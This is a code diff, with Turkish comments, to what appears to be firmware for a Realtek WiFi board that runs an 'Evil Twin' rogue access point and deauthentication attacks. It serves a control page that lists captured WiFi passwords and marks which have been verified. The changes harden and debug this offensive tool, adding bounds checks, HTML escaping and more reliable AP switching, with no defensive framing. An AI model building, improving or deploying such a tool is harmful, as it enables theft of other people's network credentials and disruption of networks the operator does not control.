@@ -192,7 +192,12 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   rtw_scan_result_t *record;
   if (scan_result->scan_complete == 0) {
     record = &scan_result->ap_details;
-    record->SSID.val[record->SSID.len] = '\0';
+    // Guard against SSID.len == buffer size — would write out-of-bounds
+    if (record->SSID.len < sizeof(record->SSID.val)) {
+      record->SSID.val[record->SSID.len] = '\0';
+    } else {
+      record->SSID.val[sizeof(record->SSID.val) - 1] = '\0';
+    }
     WiFiScanResult result;
     result.ssid    = String((const char *)record->SSID.val);
     result.channel = record->channel;
@@ -220,10 +225,17 @@ int scanNetworks() {
 }
 
 // ─── HTTP Yardımcıları ────────────────────────────────────────────────────────
-String parseRequest(String request) {
-  int path_start = request.indexOf(' ') + 1;
+String parseRequest(const String &request) {
+  int first_space = request.indexOf(' ');
+  if (first_space < 0) return "/";
+  int path_start = first_space + 1;
   int path_end   = request.indexOf(' ', path_start);
-  return request.substring(path_start, path_end);
+  if (path_end < 0) return "/";
+  // Strip query string for routing (keep it simple)
+  String path = request.substring(path_start, path_end);
+  int q = path.indexOf('?');
+  if (q >= 0) path = path.substring(0, q);
+  return (path.length() > 0) ? path : "/";
 }
 
 std::vector<std::pair<String, String>> parsePost(String &request) {
@@ -248,9 +260,21 @@ std::vector<std::pair<String, String>> parsePost(String &request) {
   return post_params;
 }
 
-// RFC 2616 uyumlu HTTP/1.1 yanıtı (\r\n ile)
+// RFC 7231 uyumlu HTTP/1.1 yanıtı (\r\n ile)
+static const char* httpStatusText(int code) {
+  switch (code) {
+    case 200: return "OK";
+    case 204: return "No Content";
+    case 302: return "Found";
+    case 400: return "Bad Request";
+    case 404: return "Not Found";
+    case 500: return "Internal Server Error";
+    default:  return "OK";
+  }
+}
+
 String makeResponse(int code, String content_type) {
-  String r  = "HTTP/1.1 " + String(code) + " OK\r\n";
+  String r  = "HTTP/1.1 " + String(code) + " " + httpStatusText(code) + "\r\n";
          r += "Content-Type: " + content_type + "\r\n";
          r += "Cache-Control: no-store\r\n";
          r += "Connection: close\r\n\r\n";
@@ -337,13 +361,13 @@ void handleRoot(WiFiClient &client) {
       int idx_2g = (scan_results[i].channel <= 14) ? (int)i : pair_idx;
       int idx_5g = (scan_results[i].channel <= 14) ? pair_idx : (int)i;
       String gid   = String(group_id);
-      String label = (scan_results[idx_2g].ssid.length() > 0)
-                       ? scan_results[idx_2g].ssid : "(gizli)";
+      String label = et_html_escape((scan_results[idx_2g].ssid.length() > 0)
+                       ? scan_results[idx_2g].ssid : "(gizli)");
 
       response += "<tr class='group-header'><td colspan='8'>&#128279; Eslestirilmis Modem &mdash; " + label;
       response += " &nbsp;<input class='cb-grp' type='checkbox' id='grp_" + gid + "' onclick='toggleGroup(" + gid + ")'> Ikisini Sec</td></tr>";
 
-      String s2g = (scan_results[idx_2g].ssid.length() > 0) ? scan_results[idx_2g].ssid : "(gizli)";
+      String s2g = et_html_escape((scan_results[idx_2g].ssid.length() > 0) ? scan_results[idx_2g].ssid : "(gizli)");
       response += "<tr class='row-2g'><td></td>";
       response += "<td><input class='cb-net grp_" + gid + "' type='checkbox' name='network' value='" + String(idx_2g) + "'></td>";
       response += "<td>" + String(idx_2g) + "</td><td>" + s2g + "</td>";
@@ -352,7 +376,7 @@ void handleRoot(WiFiClient &client) {
       response += "<td>" + String(scan_results[idx_2g].rssi) + " dBm</td>";
       response += "<td><span class='badge b2g'>2.4GHz</span></td></tr>";
 
-      String s5g = (scan_results[idx_5g].ssid.length() > 0) ? scan_results[idx_5g].ssid : "(gizli)";
+      String s5g = et_html_escape((scan_results[idx_5g].ssid.length() > 0) ? scan_results[idx_5g].ssid : "(gizli)");
       response += "<tr class='row-5g'><td></td>";
       response += "<td><input class='cb-net grp_" + gid + "' type='checkbox' name='network' value='" + String(idx_5g) + "'></td>";
       response += "<td>" + String(idx_5g) + "</td><td>" + s5g + "</td>";
@@ -365,7 +389,7 @@ void handleRoot(WiFiClient &client) {
       group_id++;
 
     } else {
-      String label = (scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "(gizli)";
+      String label = et_html_escape((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "(gizli)");
       bool   is5g  = (scan_results[i].channel >= 36);
       String rowcls = is5g ? "row-5g" : "row-2g";
       String badgec = is5g ? "b5g" : "b2g";
@@ -392,7 +416,7 @@ void handleRoot(WiFiClient &client) {
 
   if (evil_twin_active) {
     response += "<div style='background:#fdecea;border:1px solid #e74c3c;border-radius:5px;padding:10px 14px;margin-bottom:10px;font-weight:bold;color:#c0392b;'>";
-    response += "&#128308; Evil Twin AKTIF &mdash; SSID: <b>" + evil_twin_ssid + "</b>";
+    response += "&#128308; Evil Twin AKTIF &mdash; SSID: <b>" + et_html_escape(evil_twin_ssid) + "</b>";
     response += " &nbsp;|&nbsp; Kanal: " + String(evil_twin_channel);
     response += " &nbsp;|&nbsp; Bagli istemci: " + String(evil_twin_clients);
     if (evil_twin_dual_band) {
@@ -400,7 +424,7 @@ void handleRoot(WiFiClient &client) {
       response += " 2.4GHz CH:" + String(evil_twin_channel <= 13 ? evil_twin_channel : evil_twin_channel2);
       response += " &nbsp;|&nbsp; 5GHz CH:" + String(evil_twin_channel >= 36 ? evil_twin_channel : evil_twin_channel2);
       if (evil_twin_ssid2.length() > 0 && evil_twin_ssid2 != evil_twin_ssid)
-        response += " &nbsp;|&nbsp; 5GHz SSID: " + evil_twin_ssid2;
+        response += " &nbsp;|&nbsp; 5GHz SSID: " + et_html_escape(evil_twin_ssid2);
       response += "</span>";
     }
     response += "</div>";
@@ -410,7 +434,7 @@ void handleRoot(WiFiClient &client) {
       response += "<b>&#128273; Yakalanan Sifreler (" + String(et_password_count) + "):</b><br>";
       for (int i = 0; i < et_password_count; i++) {
         response += "<span style='font-family:monospace;background:#f0f0f0;padding:2px 8px;border-radius:3px;margin-right:6px;margin-top:4px;display:inline-block;'>";
-        response += et_passwords[i].ssid + " &rarr; <b>" + et_passwords[i].password + "</b>";
+        response += et_html_escape(et_passwords[i].ssid) + " &rarr; <b>" + et_html_escape(et_passwords[i].password) + "</b>";
         if (et_passwords[i].verified) response += " <span style='color:#27ae60;'>&#9989; Dogrulandi</span>";
         response += "</span>";
       }
@@ -437,7 +461,7 @@ void handleRoot(WiFiClient &client) {
     response += "<option value='-1' disabled selected>-- Ag secin --</option>";
 
     for (uint32_t i = 0; i < scan_results.size(); i++) {
-      String label = (scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "(gizli)";
+      String label = et_html_escape((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "(gizli)");
       bool   is5g  = (scan_results[i].channel >= 36);
       response += "<option value='" + String(i) + "'>";
       response += "[" + String(i) + "] ";
@@ -477,7 +501,7 @@ void handleRoot(WiFiClient &client) {
         deauth_targets[i].bssid[4], deauth_targets[i].bssid[5]);
 
       response += "<tr><td>" + String(i) + "</td>";
-      response += "<td>" + deauth_targets[i].ssid + "</td>";
+      response += "<td>" + et_html_escape(deauth_targets[i].ssid) + "</td>";
       response += "<td>" + String(pbssid_str) + "</td>";
       response += "<td>" + String(deauth_targets[i].channel) + "</td>";
       response += "<td>" + String(pbssid) + "</td>";
@@ -549,9 +573,9 @@ void handle404(WiFiClient &client) {
 
 // ─── Setup ────────────────────────────────────────────────────────────────────
 void setup() {
-  // AmebaD SDK: WiFi.apbegin() öncesi STA arayüzü tamamen kapatılmalı.
-  // Aksi hâlde AP beacon göndermez ve ağ listesinde görünmez.
-  WiFi.disableSTA();
+  // AmebaD SDK: WiFi.apbegin() öncesi mevcut bağlantı kesilmeli.
+  // Not: disableSTA() bazı AmebaD core sürümlerinde yoktur; disconnect() yeterlidir.
+  WiFi.disconnect();
   delay(300);
   WiFi.apbegin(ssid, pass, "1");
   delay(500);
@@ -606,6 +630,11 @@ void loop() {
       for (auto &p : post_data) {
         if (p.first == "idx") { idx = p.second.toInt(); break; }
       }
+
+      // Yanıt ve bağlantı kapama ÖNCE yapılmalı — WiFi.apbegin() TCP soketi öldürmeden.
+      // /rescan ile aynı desen: response → client.stop() → ağır işlem → return
+      client.write(makeRedirect("/").c_str());
+      client.stop();
 
       if (idx >= 0 && idx < (int)scan_results.size()) {
         deauth_targets.clear();
@@ -671,11 +700,14 @@ void loop() {
 
         start_evil_twin(idx);
       }
-      client.write(makeRedirect("/").c_str());
+      return;
 
     } else if (path == "/stop_evil_twin") {
-      stop_evil_twin();
+      // Aynı desen: yanıt önce gönderilir, AP sonra değiştirilir
       client.write(makeRedirect("/").c_str());
+      client.stop();
+      stop_evil_twin();
+      return;
 
     } else if (path == "/deauth") {
       std::vector<std::pair<String, String>> post_data = parsePost(request);
